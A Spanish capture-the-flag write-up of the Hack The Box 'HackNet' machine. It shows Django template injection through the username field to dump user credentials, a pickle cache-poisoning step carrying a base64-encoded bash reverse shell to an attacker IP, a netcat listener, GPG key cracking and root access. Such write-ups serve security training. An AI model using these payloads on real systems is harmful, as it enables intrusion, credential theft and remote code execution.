# HTB: HackNet Server-Side Template Injection (SSTI)

## Host: Linux
## IP: 10.10.11.85

## Procedimiento y comandos
#### Paso 1: Enumeration

* Nmap
```bash

```

* Directory:

- dirsearch:
```bash
dirsearch -u http://hacknet.htb

/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/HackNet/reports/http_hacknet.htb/_25-09-25_16-34-35.txt

Target: http://hacknet.htb/

[16:34:35] Starting: 
[16:35:48] 302 -    0B  - /comment  ->  /                                   
[16:35:52] 302 -    0B  - /contacts  ->  /                                                                                                                                                                                                  
[16:36:06] 302 -    0B  - /explore  ->  /                                                                                                                                                                                                   
[16:36:08] 404 -  555B  - /favicon.ico                                                                                                                                                                                                      
[16:36:32] 200 -  857B  - /login                                                                                                                                                                                                            
[16:36:34] 302 -    0B  - /logout  ->  /                                                                                                                                                                                                    
[16:36:39] 404 -  555B  - /media.tar                                                                                                                                                                                                        
[16:36:39] 404 -  555B  - /media.tar.bz2                                                                                                                                                                                                    
[16:36:39] 301 -  169B  - /media  ->  http://hacknet.htb/media/                                                                                                                                                                             
[16:36:39] 404 -  555B  - /media.tar.gz                                                                                                                                                                                                     
[16:36:39] 404 -  555B  - /media.zip                                                                                                                                                                                                        
[16:36:39] 403 -  555B  - /media/                                                                                                                                                                                                           
[16:36:39] 404 -  555B  - /media/export-criteo.xml                                                                                                                                                                                          
[16:36:39] 404 -  555B  - /media_admin                                                                                                                                                                                                      
[16:36:40] 302 -    0B  - /messages  ->  /                                                                                                                                                                                                  
[16:37:09] 302 -    0B  - /post  ->  /                                                                                                                                                                                                      
[16:37:15] 302 -    0B  - /profile  ->  /                                                                                                                                                                                                   
[16:37:20] 200 -  948B  - /register                                                                                                                                                                                                         
[16:37:25] 302 -    0B  - /search  ->  /                                                                                                                                                                                                    
[16:37:36] 404 -  555B  - /static/api/swagger.yaml                                                                                                                                                                                          
[16:37:36] 404 -  555B  - /static/api/swagger.json                                                                                                                                                                                          
[16:37:36] 404 -  555B  - /static/dump.sql                                                                                                                                                                                                  
                                                                                                                                                                                                                                            
Task Completed
```

No obtenemos resultados con ferox ni ffuf. Generamos una cuenta y nos logeamos.

Dentro descubrimos con wappalizer que dentro del stack la web utiliza django, por lo tanto estamos lidiando con un framework python.

Buscamos: [Hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/django.html)

_"The Django Template Language (DTL) is Turing-complete. If user-supplied data is rendered as a template string (for example by calling Template(user_input).render() or when |safe/format_html() removes auto-escaping), an attacker may achieve full SSTI â†’ RCE. "_

La prueba de concepto es simple.. si cambiamos un atributo por ejemplo de nuestro usuario podemos buscar donde impacta inspeccionando el html.
Cada vez que damos un like se dispara un endpoint http://hacknet.htb/like/10 => Success y vemos los likes en http://hacknet.htb/likes/10

Ya de por si no poder cambiar el nombre de usuario a {{7*7}} indica algo, y mas aun si creamos una cuenta con este nombre de usuario y damos lique a un post de otro usuario y pretendemos ver lso /likes/id enuna url
la pagina se cae.. porlo tanto ese codigo evidente mente se esta inyectando en algun lado.. cambiamos el nombre a {{users}}

Nos dirigimos a like/15 => success likes/15 inspeccionamos nuestra imagen y obtenemos esto dentro del atributo title en la img:

```code
<QuerySet [<SocialUser: hexhunter>, <SocialUser: rootbreaker>, <SocialUser: zero_day>, <SocialUser: shadowcaster>, <SocialUser: blackhat_wolf>, <SocialUser: bytebandit>, <SocialUser: glitch>, <SocialUser: phreaker>, <SocialUser: codebreaker>, <SocialUser: netninja>, <SocialUser: packetpirate>, <SocialUser: darkseeker>, <SocialUser: trojanhorse>, <SocialUser: exploit_wizard>, <SocialUser: whitehat>, <SocialUser: deepdive>, <SocialUser: virus_viper>, <SocialUser: brute_force>, <SocialUser: shadowwalker>, <SocialUser: {{users}}>]>
```
Podemos cambiar el nombre de usuario a {{users.values}} y ver que trae. Volvemos a inspeccionar nuestra imagen

```code
title="<QuerySet [{'id': 2, 'email': 'hexhunter@ciphermail.com', 'username': 'hexhunter', 'password': 'H3xHunt3r!', 'picture': '2.jpg', 'about': 'A seasoned reverse engineer specializing in binary exploitation. Loves diving into hex editors and uncovering hidden data.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 3, 'email': 'rootbreaker@exploitmail.net', 'username': 'rootbreaker', 'password': 'R00tBr3@ker#', 'picture': '3.jpg', 'about': 'Expert in privilege escalation and bypassing security measures. Always on the lookout for new zero-day vulnerabilities.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 4, 'email': 'zero_day@hushmail.com', 'username': 'zero_day', 'password': 'Zer0D@yH@ck', 'picture': '4.jpg', 'about': 'Focused on discovering zero-day vulnerabilities and creating proof-of-concept exploits. A dark web enthusiast.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 6, 'email': 'shadowcaster@darkmail.net', 'username': 'shadowcaster', 'password': 'Sh@d0wC@st!', 'picture': '6.jpg', 'about': 'Specializes in social engineering and OSINT techniques. A master of blending into the digital shadows.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 7, 'email': 'blackhat_wolf@cypherx.com', 'username': 'blackhat_wolf', 'password': 'Bl@ckW0lfH@ck', 'picture': '7.png', 'about': 'A black hat hacker with a passion for ransomware development. Has a reputation for leaving no trace behind.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 8, 'email': 'bytebandit@exploitmail.net', 'username': 'bytebandit', 'password': 'Byt3B@nd!t123', 'picture': '8.png', 'about': 'A skilled penetration tester and ethical hacker. Enjoys dismantling security systems and exposing their weaknesses.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': False, 'is_hidden': False, 'two_fa': False}, {'id': 9, 'email': 'glitch@cypherx.com', 'username': 'glitch', 'password': 'Gl1tchH@ckz', 'picture': '9.png', 'about': 'Specializes in glitching and fault injection attacks. Loves causing unexpected behavior in software and hardware.', 'contact_requests': 1, 'unread_messages': 1, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 11, 'email': 'phreaker@securemail.org', 'username': 'phreaker', 'password': 'Phre@k3rH@ck', 'picture': '11.png', 'about': 'Old-school hacker with roots in phone phreaking. Now enjoys exploiting telecom systems and VoIP networks.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': False, 'is_hidden': False, 'two_fa': False}, {'id': 12, 'email': 'codebreaker@ciphermail.com', 'username': 'codebreaker', 'password': 'C0d3Br3@k!', 'picture': '12.png', 'about': 'A programmer with a talent for writing malicious code and cracking software protections. Loves breaking encryption algorithms.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': False, 'is_hidden': False, 'two_fa': False}, {'id': 13, 'email': 'netninja@hushmail.com', 'username': 'netninja', 'password': 'N3tN1nj@2024', 'picture': '13.png', 'about': 'Network security expert focused on intrusion detection and prevention. Known for slicing through firewalls with ease.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 14, 'email': 'packetpirate@exploitmail.net', 'username': 'packetpirate', 'password': 'P@ck3tP!rat3', 'picture': '14.png', 'about': 'A packet sniffer who loves capturing and analyzing network traffic. Always hunting for sensitive data in the ether.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 15, 'email': 'darkseeker@darkmail.net', 'username': 'darkseeker', 'password': 'D@rkSeek3r#', 'picture': '15.png', 'about': 'A hacker who thrives in the dark web. Specializes in anonymity tools and hidden service exploitation.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 17, 'email': 'trojanhorse@securemail.org', 'username': 'trojanhorse', 'password': 'Tr0j@nH0rse!', 'picture': '17.jpg', 'about': 'Malware developer with a focus on creating and deploying Trojan horses. Enjoys watching systems crumble from within.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': False, 'is_hidden': False, 'two_fa': False}, {'id': 19, 'email': 'exploit_wizard@hushmail.com', 'username': 'exploit_wizard', 'password': 'Expl01tW!zard', 'picture': '19.jpg', 'about': 'An expert in exploit development and vulnerability research. Loves crafting new ways to break into systems.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 21, 'email': 'whitehat@darkmail.net', 'username': 'whitehat', 'password': 'Wh!t3H@t2024', 'picture': '21.jpg', 'about': 'An ethical hacker with a mission to improve cybersecurity. Works to protect systems by exposing and patching vulnerabilities.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 22, 'email': 'deepdive@hacknet.htb', 'username': 'deepdive', 'password': 'D33pD!v3r', 'picture': '22.png', 'about': 'Specializes in deep web exploration and data extraction. Always looking for hidden gems in the darkest corners of the web.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': False, 'is_hidden': False, 'two_fa': True}, {'id': 23, 'email': 'virus_viper@securemail.org', 'username': 'virus_viper', 'password': 'V!rusV!p3r2024', 'picture': '23.jpg', 'about': 'A malware creator focused on developing viruses that spread rapidly. Known for unleashing digital plagues.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 24, 'email': 'brute_force@ciphermail.com', 'username': 'brute_force', 'password': 'BrUt3F0rc3#', 'picture': '24.jpg', 'about': 'Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': False, 'two_fa': False}, {'id': 25, 'email': 'shadowwalker@hushmail.com', 'username': 'shadowwalker', 'password': 'Sh@dowW@lk2024', 'picture': '25.jpg', 'about': 'A digital infiltrator who excels in covert operations. Always finds a way to walk through the shadows undetected.', 'contact_requests': 0, 'unread_messages': 0, 'is_public': False, 'is_hidden': False, 'two_fa': False}, {'id': 33, 'email': 'w@w.com', 'username': '{{users.values}}', 'password': 'p123', 'picture': 'profile.png', 'about': '', 'contact_requests': 0, 'unread_messages': 0, 'is_public': True, 'is_hidden': True, 'two_fa': False}]>"
```

Obtuvimos credenciales de todos los usuarios. Ordenamos en archivos separados y propagamos por ssh para ver quien tiene acceso.

#### Paso 2: Acceso inicial

Hay dos usuarios con las siguientes credenciales:

|email | user | pass |
|------|------|------|
|deepdive@hacknet.htb |	deepdive | D33pD!v3r |
|mikey@hacknet.htb |backdoor_bandit |mYd4rks1dEisH3re|

Ambos parecen tener un mail corporativo.. podemos descartar el resto e intentar acceder por ssh con sus mails y credenciales.

```bash
ssh mikey@hacknet.htb                           
The authenticity of host 'hacknet.htb (10.10.11.85)' can't be established.
ED25519 key fingerprint is SHA256:TVT7HGjgzl5Wk42d9xFlPlDUwhNCWjWA5Cdz6MdUC9o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'hacknet.htb' (ED25519) to the list of known hosts.
mikey@hacknet.htb's password: 
Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Sep 25 18:44:27 2025 from 10.10.14.22
mikey@hacknet:~$ 
```

* Obtenemos el user flag:

```bash
mikey@hacknet:~$ cat user.txt 
d02f07a89f30f6500dd95bdf1c852412
```

#### Paso 3: Movimiento lateral

Hay dos posibles vectores a explorar:

1. Explorar la base de datos hacknet que corre en 127.0.0.1:3306

2. Explorar la manera en la que python serializa y deserializa objetos **pickling**

Encontramos:
```code
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'hacknet',
        'USER': 'sandy',
        'PASSWORD': 'h@ckn3tDBpa$$',
        'HOST':'localhost',
        'PORT':'3306',
    }
}
```

```bash
mysql -u sandy -p -h 127.0.0.1 hacknet --skpi-ssl

enter password: h@ckn3tDBpa$$
```
> De la base de datos obtuvimos un hash admin que no fue posible crackear.

En Python, pickle (o â€œpicklingâ€) es el mecanismo que permite serializar y deserializar objetos.

ðŸ‘‰ Serializar = convertir un objeto de Python (listas, diccionarios, clases, etc.) en una secuencia de bytes para poder guardarlo en un archivo o enviarlo por red.
ðŸ‘‰ Deserializar (unpickle) = hacer la operaciÃ³n inversa, es decir, reconstruir el objeto original a partir de los bytes.

Volviendo al post de [Hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/django.html#pickle-backed-session-cookie-rce) 
en la seccion pickle backed session cookie rce podemos encontrar una pista que seguir.

Si navegamos por la pagina por ejemplo desde el menu > explore y luego en la session ssh observamos los archivos cache de django obtenemos lo siguiente:

```bash
mikey@hacknet:/var/tmp/django_cache$ ls -lt /var/tmp/django_cache/*.djcache | head
-rwxrwxrwx 1 mikey mikey 7 Sep 25 22:38 /var/tmp/django_cache/90dbab8f3b1e54369abdeb4ba1efc106.djcache                                                                                                                                      
-rwxrwxrwx 1 mikey mikey 7 Sep 25 22:38 /var/tmp/django_cache/1f0acfe7480a469402f1852f8313db86.djcache
```
podemos ver que: _"[Cache Manipulation to RCE](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/django.html#cache-manipulation-to-rce)"_

```bash
mikey@hacknet:/var/tmp/django_cache$ find / -writable -group mikey 2>/dev/null                                                                                                                                                       
/var/tmp/django_cache/1f0acfe7480a469402f1852f8313db86.djcache                                                                                                                                                                              
/var/tmp/django_cache/90dbab8f3b1e54369abdeb4ba1efc106.djcache 
```

Por lo tanto la idea es generar un exploit que django desserialize ejectuando en contexto sandy y logrando un reverse shell o RCE.

Flow:

1. Subir el exploit a /tmp 
2. Serciorarse de que **/var/tmp/django_cache/** este vacio
3. Ejecutamos el exploit.

Exploit:

1. Generamos payload y codificamos a base64

```bash
echo "(bash >& /dev/tcp/10.10.14.22/4444 0>&1) &" | base64
KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjIvNDQ0NCAwPiYxKSAmCg==
```

2. Componemos el exploit en 3 partes:

* Setteo de variables,
	1. directorio del cache **/var/tmp/django_cache** 
	2. comando a ejecutar, **KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjIvNDQ0NCAwPiYxKSAmCg==**

* Generamos el pickle payload

* Ejecutamos un loop que inyecte el payload por cada archvio *.djcache dentro del directorio

Una vez ejecutado el exploit navegamos en el sitio con el receptor activo para que django active su sistema de cache y obtenemos el shell.

#### Paso 4: Escalada de privilegios

```bash
nc -lvnp 4444    
listening on [any] 4444 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.85] 32782
whoami
sandy
ls -la .ssh
ls: cannot access '.ssh': No such file or directory
SHELL=/bin/bash script -q /dev/null
sandy@hacknet:/var/www/HackNet$ 
```

Podemos ver en el directorio /home/sandy una carpeta **.gnupg** que dentro contiene lo siguiente:

[GPG-Keys](https://www.privex.io/articles/what-is-gpg/) [Exploit Notes](https://exploit-notes.hdks.org/exploit/cryptography/algorithm/gpg/)

```bash
sandy@hacknet:~$ ls -la .gnupg                                                                                           

total 32                                                                                                             
drwx------ 4 sandy sandy 4096 Sep  5 11:33 .                                                                         
drwx------ 6 sandy sandy 4096 Sep 11 11:18 ..                                                                                                        
drwx------ 2 sandy sandy 4096 Sep  5 11:33 openpgp-revocs.d                                                                                          
drwx------ 2 sandy sandy 4096 Sep  5 11:33 private-keys-v1.d                                                                                         
-rw-r--r-- 1 sandy sandy  948 Sep  5 11:33 pubring.kbx                                                                                               
-rw------- 1 sandy sandy   32 Sep  5 11:33 pubring.kbx~                                                                                              
-rw------- 1 sandy sandy  600 Sep  5 11:33 random_seed                                                                                               
-rw------- 1 sandy sandy 1280 Sep  5 11:33 trustdb.gpg                                                                                               
sandy@hacknet:~/.gnupg$ 
```

Antes de seguir estabilizamos el shell conectandonos por ssh:

1. Copiamos nuestro public rsa
```bash
sandy@hacknet:~$ mkdir .ssh && cd .ssh                                                                    
mkdir .ssh && cd .ssh                                                                                     
sandy@hacknet:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFPL/ryp9GqCnHH8IqZ8/NcWJNwuBXMq1BJyAVIen9ps7ZwnGcppvIZvjZX7yapFniFzlDWd0+a8/KmQmgfNZkSf7gqd6MH3oya+iNE9PXqyKA8btqBVOdV0jnPj9HYnzJ5oP+46ZS3oYBCyUJ3CKRzjexQPiXz9u+0bvoXkEUlDPpKrQliGeqdBXleJqoX6IQUOX/UUrQAV4d1w2EqNrVwKQnJthr43zUd30w+guy3NJj2HsYQoSkKz0x3ka9mone/rTiNFe8qFdSL+IO1a3/FtUNfH+cCSalYtUxxE/KmXaUvcBTcBIbyGwv9dD1F1Z65R73vd9OSBrCwv+fpgyf8jN2RsbiB3r0c+mq
<3r0c+mqYahXE8t6z0Phu0= root@kali" > authorized_keys
```
2. Nos conectamos:

```bash
ssh sandy@hacknet.htb                       
Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Sep 25 23:26:11 2025 from 10.10.14.22
sandy@hacknet:~$ 
```
* Descargamos a kali las claves:

```bash
# Copiamos a kali
scp sandy@hacknet.htb:/home/sandy/.gnupg/private-keys-v1.d/* GPG-keys 
0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key                                       100% 1255     2.0KB/s   00:00    
EF995B85C8B33B9FC53695B9A3B597B325562F4F.key                                       100% 1255     2.0KB/s   00:00    
armored_key.asc                                                                                   100% 2088     4.2KB/s   00:00    
armored_key.asc                                                                                          100% 2088     2.8KB/s   00:00  
```

* Generamos un hash para crackear y obtener un password si lo hay

```bash
gpg2john armored_key.asc > hash

File armored_key.asc
```

* Crackeamos el hash:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash              
Warning! john.conf section [list.rules:sshrules] is multiple declared.
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetheart       (Sandy)     
1g 0:00:00:09 DONE (2025-09-26 00:36) 0.1001g/s 42.44p/s 42.44c/s 42.44C/s gandako..ladybug
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

* Importamos en la victima al path $HOME la clave privada

```bash
sandy@hacknet:~/.gnupg/private-keys-v1.d$ gpg --import "$HOME/.gnupg/private-keys-v1.d/armored_key.asc"
gpg: key D72E5C1FA19C12F7: "Sandy (My key for backups) <sandy@hacknet.htb>" not changed
gpg: key D72E5C1FA19C12F7: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
```

* Dumpeamos con un script los archvios backup0x.sql.gpg

> usamos en el script las credenciales de sandy

Subimos el script:

```bash
scp backup-dumper.sh sandy@hacknet.htb:/tmp
backup-dumper.sh  
```

Ejecutamos:

```bash
sandy@hacknet:/tmp$ chmod +x backup-dumper.sh
sandy@hacknet:/tmp$ ./backup-dumper.sh
[*] Importing GPG private key from: /home/sandy/.gnupg/private-keys-v1.d/armored_key.asc
gpg: key D72E5C1FA19C12F7: "Sandy (My key for backups) <sandy@hacknet.htb>" not changed
gpg: key D72E5C1FA19C12F7: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
[*] Decrypting /var/www/HackNet/backups/backup01.sql.gpg â†’ /tmp/backup01.sql.sql
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
gpg: decryption failed: No secret key
[*] Decrypting /var/www/HackNet/backups/backup02.sql.gpg â†’ /tmp/backup02.sql.sql
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
[*] Decrypting /var/www/HackNet/backups/backup03.sql.gpg â†’ /tmp/backup03.sql.sql
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
[*] Done. Decrypted files are in /tmp
```

Nos traemos los archivos:

```bash
mkdir backups && cd backups
scp sandy@hacknet.htb:/tmp/*.sql .                                                               
backup01.sql.sql                                                                  100%   47KB  46.8KB/s   00:01    
backup02.sql.sql                                                                  100%   47KB  77.3KB/s   00:00    
backup03.sql.sql 
```

15 doritos despues >>>

#### En backaup02 vemos:

```bash
(50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Hereâ€™s the password: h4ck3rs4re3veRywh3re99. Let me know when youâ€™re done.',1,18,22),
```

```bash
ssh root@hacknet.htb          
root@hacknet.htb's password: 
Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep 26 07:53:03 2025 from 10.10.14.22
root@hacknet:~# ls
root.txt
root@hacknet:~# cat root.txt
bdab0648a28606a99f0f4cd2bcddba62
root@hacknet:~# 
```
